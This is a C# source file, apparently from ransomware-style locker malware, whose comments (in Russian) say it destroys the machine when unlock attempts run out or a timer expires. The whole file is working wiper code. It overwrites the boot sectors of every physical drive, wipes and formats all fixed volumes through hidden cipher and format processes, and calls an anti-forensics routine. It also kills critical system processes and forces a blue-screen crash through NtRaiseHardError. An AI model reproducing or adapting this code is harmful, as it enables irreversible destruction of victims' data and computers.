using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace ns0
{
    // Полное уничтожение: перезапись MBR/GPT + формат всех томов.
    // Запускается при исчерпании попыток ввода или истечении таймера.
    internal static class Destruction
    {
        private const string WipedFlagRegPath = @"SOFTWARE\Locker\State";
        private const string WipedFlagName = "Wiped";

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr CreateFileW(
            string fileName, uint desiredAccess, uint shareMode,
            IntPtr securityAttributes, uint creationDisposition,
            uint flagsAndAttributes, IntPtr templateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteFile(
            IntPtr hFile, byte[] buffer, uint bytesToWrite,
            out uint bytesWritten, IntPtr overlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetFilePointer(
            IntPtr hFile, int low, IntPtr high, uint method);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr handle);

        private const uint GENERIC_WRITE = 0x40000000;
        private const uint OPEN_EXISTING = 3;
        private const uint FILE_SHARE_WRITE = 2;
        private const uint FILE_SHARE_READ = 1;
        private const uint FILE_FLAG_WRITE_THROUGH = 0x80000000;
        private static readonly IntPtr INVALID_HANDLE = new IntPtr(-1);

        public static bool IsAlreadyWiped()
        {
            try
            {
                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(WipedFlagRegPath, false))
                {
                    object v = key?.GetValue(WipedFlagName);
                    if (v is int) return (int)v == 1;
                    if (v != null) return v.ToString() == "1";
                }
            }
            catch { }
            return false;
        }

        private static void MarkWiped()
        {
            try
            {
                using (var key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(WipedFlagRegPath))
                {
                    key.SetValue(WipedFlagName, 1, Microsoft.Win32.RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        // Точка входа. Идемпотентна: повторный вызов не дублирует.
        public static void ExecuteAll()
        {
            if (IsAlreadyWiped()) return;
            MarkWiped();

            Task.Run(delegate ()
            {
                try { AntiForensics.ScrubAll(); } catch { }
                try { OverwriteBootSectors(); } catch { }
                try { WipeAllVolumes(); } catch { }
                try { AntiForensics.ScrubAll(); } catch { }
                try { ForceShutdown(); } catch { }
            });
        }

        // Перезапись первых секторов каждого физического диска (MBR/GPT).
        public static void OverwriteBootSectors()
        {
            // 1 МБ мало: GPT backup header живёт в конце диска, а вторичные структуры —
            // дальше первых мегабайт. Пишем 16 МБ на проход, два прохода.
            const int wipeSize = 16 * 1024 * 1024;
            byte[] junk = new byte[1024 * 1024];
            using (var rng = System.Security.Cryptography.RandomNumberGenerator.Create())
            {
                rng.GetBytes(junk);
            }

            foreach (int index in EnumeratePhysicalDriveIndices())
            {
                int i = index;
                string path = @"\\.\PhysicalDrive" + i;
                IntPtr h = CreateFileW(path, GENERIC_WRITE,
                    FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero,
                    OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, IntPtr.Zero);

                if (h == INVALID_HANDLE) continue;

                try
                {
                    for (int pass = 0; pass < 2; pass++)
                    {
                        SetFilePointer(h, 0, IntPtr.Zero, 0);
                        int writtenTotal = 0;
                        uint written;
                        while (writtenTotal < wipeSize)
                        {
                            if (!WriteFile(h, junk, (uint)junk.Length, out written, IntPtr.Zero)) break;
                            if (written == 0) break;
                            writtenTotal += (int)written;
                        }
                    }
                }
                finally
                {
                    CloseHandle(h);
                }
            }
        }

        // Перечисление индексов физических дисков через WMI. Fallback — диапазон 0..15.
        private static int[] EnumeratePhysicalDriveIndices()
        {
            try
            {
                var indices = new System.Collections.Generic.List<int>();
                using (var searcher = new System.Management.ManagementObjectSearcher("SELECT Index FROM Win32_DiskDrive"))
                using (var col = searcher.Get())
                {
                    foreach (System.Management.ManagementObject mo in col)
                    {
                        try
                        {
                            object v = mo["Index"];
                            if (v != null)
                            {
                                int idx;
                                if (int.TryParse(v.ToString(), out idx)) indices.Add(idx);
                            }
                        }
                        catch { }
                    }
                }
                if (indices.Count > 0) return indices.ToArray();
            }
            catch { }

            var fallback = new System.Collections.Generic.List<int>();
            for (int i = 0; i < 16; i++) fallback.Add(i);
            return fallback.ToArray();
        }



        // Формат всех томов через format.com + cipher overwrite.
        public static void WipeAllVolumes()
        {
            string systemDrive = Path.GetPathRoot(Environment.SystemDirectory);
            try
            {
                foreach (var di in DriveInfo.GetDrives())
                {
                    if (di.DriveType != DriveType.Fixed) continue;
                    string root = di.Name;

                    // cipher /w проходит по свободному месту; для полного диска одной
                    // проходки мало — прогоняем дважды, потом формат без /q.
                    RunHidden("cipher.exe", "/w:" + root);
                    RunHidden("cipher.exe", "/w:" + root);

                    if (!string.Equals(root, systemDrive, StringComparison.OrdinalIgnoreCase))
                    {
                        // /q оставляет восстанавливаемые данные; /p:3 — три прохода записи по нулям
                        // (для HDD; для SSD TRIM всё равно делает полное стирание невозможным).
                        string letter = root.TrimEnd('\\', ':');
                        RunHidden("format.com", letter + ": /fs:NTFS /p:3 /y /v:DAVIDENKO");
                    }
                }
            }
            catch { }
        }

        private static void RunHidden(string file, string args)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = file,
                    Arguments = args,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    RedirectStandardInput = true
                };
                using (var p = Process.Start(psi))
                {
                    if (p == null) return;
                    try { p.StandardInput.WriteLine("y"); } catch { }
                    p.WaitForExit(60000);
                }
            }
            catch { }
        }

        public static void ForceShutdown()
        {
            try { Process.Start("shutdown.exe", "/s /f /t 0"); } catch { }
        }

        public static void RunUntilDead()
        {
            if (IsAlreadyWiped()) MarkWiped();

            try { OverwriteBootSectors(); } catch { }
            try { WipeAllVolumes(); }       catch { }
            try { ForceShutdown(); }        catch { }

            HardLock();

            while (true)
            {
                try { Console.Beep(1800, 500); } catch { }
                try { LockWorkStation(); }       catch { }
                Thread.Sleep(100);
            }
        }

        public static void HardLock()
        {
            // NtRaiseHardError с 0xC000021A требует SeShutdownPrivilege в токене —
            // включаем его явно, иначе вызов молча проглатывается.
            EnablePrivilege("SeShutdownPrivilege");

            try
            {
                var psi = new ProcessStartInfo("cmd.exe",
                    "/c taskkill /f /im winlogon.exe /im csrss.exe /im services.exe /im lsass.exe")
                { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = false };
                Process.Start(psi);
            }
            catch { }

            try
            {
                // STATUS_ASSERTION_FAILURE — надёжнее ведёт к bugcheck, чем 0xC000021A.
                uint status = 0xC0000420;
                uint paramCount = 0;
                IntPtr mask = IntPtr.Zero;
                IntPtr parms = IntPtr.Zero;
                uint validResponse = 6;
                IntPtr response;
                NtRaiseHardError(status, paramCount, mask, parms, validResponse, out response);
            }
            catch { }
        }

        [System.Runtime.InteropServices.DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(IntPtr processHandle, uint desiredAccess, out IntPtr tokenHandle);

        [System.Runtime.InteropServices.DllImport("advapi32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
        private static extern bool LookupPrivilegeValue(string host, string name, out long luid);

        [System.Runtime.InteropServices.DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool AdjustTokenPrivileges(IntPtr tokenHandle, bool disableAllPrivileges,
            ref TOKEN_PRIVILEGES newState, int bufferLength, IntPtr previousState, IntPtr returnLength);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetCurrentProcess();

        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
        private struct LUID_AND_ATTRIBUTES
        {
            public long Luid;
            public uint Attributes;
        }

        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
        private struct TOKEN_PRIVILEGES
        {
            public uint PrivilegeCount;
            public LUID_AND_ATTRIBUTES Privileges;
        }

        private const uint TOKEN_ADJUST_PRIVILEGES = 0x20;
        private const uint TOKEN_QUERY = 0x8;
        private const uint SE_PRIVILEGE_ENABLED = 0x2;

        private static void EnablePrivilege(string privilegeName)
        {
            IntPtr token = IntPtr.Zero;
            try
            {
                if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out token))
                    return;

                long luid;
                if (!LookupPrivilegeValue(null, privilegeName, out luid))
                    return;

                var tp = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Privileges = new LUID_AND_ATTRIBUTES { Luid = luid, Attributes = SE_PRIVILEGE_ENABLED }
                };
                AdjustTokenPrivileges(token, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            }
            catch { }
            finally
            {
                if (token != IntPtr.Zero) try { CloseHandle(token); } catch { }
            }
        }

        [DllImport("user32.dll")]
        private static extern bool LockWorkStation();

        [DllImport("ntdll.dll")]
        private static extern int NtRaiseHardError(
            uint status, uint numberOfParameters,
            IntPtr unicodeStringParameterMask, IntPtr parameters,
            uint validResponseOption, out IntPtr response);
    }
}